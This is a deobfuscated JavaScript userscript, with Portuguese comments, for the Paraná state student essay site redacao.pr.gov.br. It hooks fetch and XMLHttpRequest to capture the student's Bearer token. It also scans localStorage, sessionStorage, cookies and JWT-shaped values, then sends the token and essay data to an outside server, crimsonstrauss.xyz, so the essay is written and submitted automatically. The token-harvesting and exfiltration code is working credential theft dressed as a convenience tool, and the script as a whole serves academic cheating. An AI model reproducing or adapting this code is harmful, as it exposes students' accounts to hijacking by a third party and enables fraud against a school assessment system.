// Código desobfuscado - Script de Redação Paraná
// Este script automatiza redações no site redacao.pr.gov.br

(function() {
    'use strict';
    
    // Adiciona estilos CSS
    const styles = `
    .crs-modal-bg {
        position: fixed;
        z-index: 9999;
        top: 0; left: 0; right: 0; bottom: 0;
        background: rgba(10,10,10,0.88);
        backdrop-filter: blur(4px);
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: 'Inter', 'Roboto', sans-serif;
    }
    .crs-modal {
        background: #181020;
        border: 2px solid #7D3FFF;
        border-radius: 16px;
        box-shadow: 0 0 32px #7D3FFF55;
        padding: 32px 24px 24px 24px;
        min-width: 320px;
        max-width: 95vw;
        text-align: center;
        position: relative;
        animation: crsFadeIn 0.4s;
    }
    @keyframes crsFadeIn { from { opacity: 0; transform: translateY(30px);} to { opacity: 1;transform: none;}}
    .crs-logo {
        width: 90px;
        margin-bottom: 18px;
        border-radius: 12px;
        border: 2px solid #7D3FFF;
        box-shadow: 0 0 10px #7D3FFF66;
        background: #111;
    }
    .crs-title {
        color: #fff;
        font-size: 1.6rem;
        margin-bottom: 8px;
        font-weight: 700;
        letter-spacing: 0.04em;
    }
    .crs-sub {
        color: #b39ddb;
        font-size: 1.06rem;
        margin-bottom: 18px;
    }
    .crs-process-btn {
        background: #7D3FFF;
        color: #fff;
        border: 2px solid #7D3FFF;
        border-radius: 8px;
        padding: 11px 22px;
        font-size: 1.2rem;
        font-weight: 600;
        margin: 8px auto;
        cursor: pointer;
        transition: background 0.2s, border 0.2s;
        box-shadow: 0 0 6px #7D3FFF55;
        display: block;
        width: 80%;
    }
    .crs-process-btn:hover {
        background: #6930FF;
        border-color: #6930FF;
    }
    .crs-discord-btn {
        background: #2C1A4E;
        color: #fff;
        font-weight: 600;
        border: 2px solid #7D3FFF;
        border-radius: 8px;
        padding: 11px 22px;
        font-size: 1.05rem;
        margin: 12px auto;
        cursor: pointer;
        transition: background 0.2s, box-shadow 0.2s;
        box-shadow: 0 0 10px #7D3FFF44;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        width: 80%;
    }
    .crs-discord-btn:hover {
        background: #3C2A5E;
    }
    .crs-discord-btn svg {
        width: 20px;
        height: 20px;
        flex-shrink: 0;
    }
    .crs-credits {
        margin-top: 24px;
        font-size: 0.9rem;
        color: #7D3FFF;
        font-weight: 500;
        opacity: 0.85;
        letter-spacing: 0.03em;
    }
    .crs-loading-modal {
        background: #181020ee;
        border: 2px solid #7D3FFF;
        border-radius: 18px;
        padding: 40px 32px;
        min-width: 240px;
        max-width: 95vw;
        text-align: center;
        position: fixed;
        left: 50%; top: 50%;
        transform: translate(-50%,-50%);
        z-index: 10000;
        box-shadow: 0 0 32px #7D3FFF77;
        color: #fff;
        animation: crsFadeIn 0.4s;
    }
    .crs-loader {
        width: 42px; height: 42px;
        border: 4px solid #7D3FFF88;
        border-top: 4px solid #7D3FFF;
        border-radius: 50%;
        margin: 0 auto 16px auto;
        animation: crsSpin 1s linear infinite;
    }
    @keyframes crsSpin { 100% {transform: rotate(360deg);} }
    .crs-loading-title { font-size: 1.25rem; font-weight: 700; color: #fff;}
    .crs-loading-sub { font-size: 1.0rem; color: #b39ddb; margin-top: 6px;}
    .crs-toast, .crs-warning {
        position: fixed;
        bottom: 32px; left: 50%; transform: translateX(-50%);
        background: #181020;
        color: #fff;
        border: 2px solid #7D3FFF;
        border-radius: 10px;
        font-size: 1.1em;
        padding: 16px 32px;
        box-shadow: 0 0 18px #7D3FFF88;
        z-index: 10001;
        font-weight: 600;
        animation: crsFadeIn 0.22s;
        display: flex;
        align-items: center;
        gap: 7px;
    }
    .crs-warning {
        border: 2px solid #FFC107;
        color: #FFC107;
        background: #181020;
    }
    .crs-warning-icon {
        display:inline-block;
        vertical-align:middle;
        margin-right:6px;
        font-size: 1.3em;
    }`;
    
    const styleElement = document.createElement('style');
    styleElement.textContent = styles;
    document.head.appendChild(styleElement);
    
    // Verifica se está na URL correta
    function isCorrectURL() {
        const urlPattern = /^https:\/\/redacao\.pr\.gov\.br\/student-write-essay\/\d+\/\d+$/;
        return urlPattern.test(window.location.href);
    }
    
    // Mostra o modal principal
    function showMainModal() {
        if (document.querySelector('.crs-modal-bg')) return;
        
        const modalBg = document.createElement('div');
        modalBg.className = 'crs-modal-bg';
        modalBg.innerHTML = `
            <div class="crs-modal">
                <img src="https://crimsonstrauss.xyz/img/logo/eclipse.png" class="crs-logo" alt="CrimsonStrauss Logo">
                <div class="crs-title">Redação Paraná</div>
                <div class="crs-sub">Transforme sua redação com nosso script!</div>
                <button class="crs-process-btn" id="crs-process-btn">Processar Redação</button>
                <button class="crs-discord-btn" id="crs-discord-btn">
                    <svg width="20" height="20" viewBox="0 0 22 22" fill="none">
                        <path d="M17.7 1.5C15.1 0.6 12.7 0 11 0S6.9 0.6 4.3 1.5A1.3 1.3 0 0 0 3.7 2.1C0.6 7.1-0.2 12.1 0 17.1a1.3 1.3 0 0 0 .8 1.1C3.5 19.6 7.3 21 11 21s7.5-1.4 10.2-2.8a1.3 1.3 0 0 0 .8-1.1c0-5-0.8-10-3.7-15a1.3 1.3 0 0 0-.6-.6z" fill="#fff"/>
                        <ellipse cx="7.5" cy="14" rx="1.5" ry="2" fill="#fff"/>
                        <ellipse cx="14.5" cy="14" rx="1.5" ry="2" fill="#fff"/>
                    </svg>
                    Entre no nosso Discord
                </button>
                <div class="crs-credits">Powered by CrimsonStrauss</div>
            </div>
        `;
        
        document.body.appendChild(modalBg);
        
        document.getElementById('crs-discord-btn').onclick = function() {
            window.open('https://discord.gg/H6V7RWzKgV', '_blank');
        };
        
        document.getElementById('crs-process-btn').onclick = async function() {
            removeMainModal();
            showLoadingModal();
            try {
                await processEssay();
            } catch (error) {
                showToast('Erro no processamento: ' + (error.message || error));
            }
        };
    }
    
    // Remove o modal principal
    function removeMainModal() {
        const modal = document.querySelector('.crs-modal-bg');
        if (modal) modal.remove();
    }
    
    // Mostra modal de carregamento
    function showLoadingModal() {
        removeLoadingModal();
        const loadingModal = document.createElement('div');
        loadingModal.className = 'crs-loading-modal';
        loadingModal.innerHTML = `
            <div class="crs-loader"></div>
            <div class="crs-loading-title">Fazendo redação...</div>
            <div class="crs-loading-sub">Isso pode demorar alguns segundos</div>
            <div class="crs-credits">Créditos: CrimsonStrauss</div>
        `;
        document.body.appendChild(loadingModal);
    }
    
    // Remove modal de carregamento
    function removeLoadingModal() {
        const loading = document.querySelector('.crs-loading-modal');
        if (loading) loading.remove();
    }
    
    // Mostra toast de notificação
    function showToast(message) {
        removeToast();
        const toast = document.createElement('div');
        toast.className = 'crs-toast';
        toast.textContent = message;
        document.body.appendChild(toast);
        setTimeout(removeToast, 2000);
    }
    
    // Remove toast
    function removeToast() {
        const toast = document.querySelector('.crs-toast');
        if (toast) toast.remove();
    }
    
    // Mostra warning
    function showWarning(message) {
        removeWarning();
        const warning = document.createElement('div');
        warning.className = 'crs-warning';
        warning.innerHTML = '<span class="crs-warning-icon">⚠️</span>' + message;
        document.body.appendChild(warning);
        setTimeout(removeWarning, 4000);
    }
    
    // Remove warning
    function removeWarning() {
        const warning = document.querySelector('.crs-warning');
        if (warning) warning.remove();
    }
    
    // Processa a redação
    async function processEssay() {
        try {
            if (!isCorrectURL()) {
                removeLoadingModal();
                showWarning('Você precisa estar na página da redação para usar este script!');
                return;
            }
            
            // Extrai IDs da URL
            const urlData = ((() => {
                const url = window.location.href;
                const match = url.match(/student-write-essay\/(\d+)\/(\d+)/);
                if (!match) return null;
                return {
                    'essayId': match[1],
                    'studentId': match[2]
                };
            })());
            
            if (!urlData) {
                removeLoadingModal();
                showToast('URL não corresponde ao padrão esperado');
                return;
            }
            
            // Intercepta requisições para capturar o token
            function setupTokenInterception() {
                const originalFetch = window.fetch;
                window.fetch = function(...args) {
                    const [url, options] = args;
                    if (options && options.headers) {
                        const headers = options.headers instanceof Headers ? 
                            options.headers : new Headers(options.headers);
                        const authHeader = headers.get('Authorization') || headers.get('authorization');
                        if (authHeader && authHeader.startsWith('Bearer ')) {
                            window._crsInterceptedToken = authHeader.substring(7);
                        }
                    }
                    return originalFetch.apply(this, args);
                };
                
                const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
                XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
                    if (header.toLowerCase() === 'authorization' && value.startsWith('Bearer ')) {
                        window._crsInterceptedToken = value.substring(7);
                    }
                    return originalSetRequestHeader.apply(this, arguments);
                };
            }
            
            setupTokenInterception();
            
            // Busca o token
            function getToken() {
                if (window._crsInterceptedToken) return window._crsInterceptedToken;
                
                const tokenKeys = ['token', 'authToken', 'auth_token', 'access_token', 'bearerToken', 'jwt', 'Token'];
                
                // Procura no localStorage
                for (let key of tokenKeys) {
                    const value = localStorage.getItem(key);
                    if (value) return value;
                }
                
                // Procura no sessionStorage
                for (let key of tokenKeys) {
                    const value = sessionStorage.getItem(key);
                    if (value) return value;
                }
                
                // Procura nos cookies
                const cookies = document.cookie.split(';');
                for (let cookie of cookies) {
                    const [name, value] = cookie.trim().split('=');
                    if (tokenKeys.includes(name)) return value;
                }
                
                // Procura por padrão JWT no localStorage
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    if (value && typeof value === 'string' && value.includes('.') && value.split('.').length === 3) {
                        return value;
                    }
                }
                
                return null;
            }
            
            const token = getToken();
            
            if (!token) {
                removeLoadingModal();
                showToast('Token não encontrado. Verifique se está logado.');
                return;
            }
            
            // Busca dados da proposta
            async function fetchProposal(token, essayId, studentId) {
                const apiUrl = 'https://redacao-api.pr.gov.br/api/v2/proposta/' + essayId + '/estudante/' + studentId;
                try {
                    const response = await fetch(apiUrl, {
                        'method': 'GET',
                        'headers': {
                            'Authorization': 'Bearer ' + token,
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }
                    });
                    
                    if (response.ok) return await response.json();
                    else throw new Error('Erro HTTP: ' + response.status);
                } catch (error) {
                    return null;
                }
            }
            
            let proposalData = await fetchProposal(token, urlData.essayId, urlData.studentId);
            
            // Envia para processamento
            async function submitToServer(token, responseData, essayId, studentId) {
                const serverUrl = 'https://crimsonstrauss.xyz:3003/make_redacaopr';
                const payload = {
                    'token': token,
                    'response': responseData,
                    'essayId': parseInt(essayId),
                    'studentId': parseInt(studentId),
                    'apiUrl': 'https://redacao-api.pr.gov.br/api/v2/proposta/' + essayId + '/estudante/' + studentId
                };
                
                const response = await fetch(serverUrl, {
                    'method': 'POST',
                    'headers': {
                        'Content-Type': 'application/json'
                    },
                    'body': JSON.stringify(payload)
                });
                
                if (response.ok) return await response.json();
                else {
                    const errorText = await response.text();
                    throw new Error('Erro do servidor: ' + response.status + ' - ' + errorText);
                }
            }
            
            const result = await submitToServer(token, proposalData, urlData.essayId, urlData.studentId);
            
            if (result && result.success) {
                removeLoadingModal();
                showToast('Redação processada com sucesso!');
                setTimeout(function() {
                    window.location.reload();
                }, 2000);
            } else {
                removeLoadingModal();
                showToast('Falha no processamento');
            }
            
        } catch (error) {
            removeLoadingModal();
            showToast('Erro: ' + (error.message || error));
        }
    }
    
    // Aguarda e executa
    setTimeout(function() {
        if (isCorrectURL()) {
            showMainModal();
        } else {
            showWarning('Você precisa estar na página da redação para usar este script!');
        }
    }, 900);
    
})();
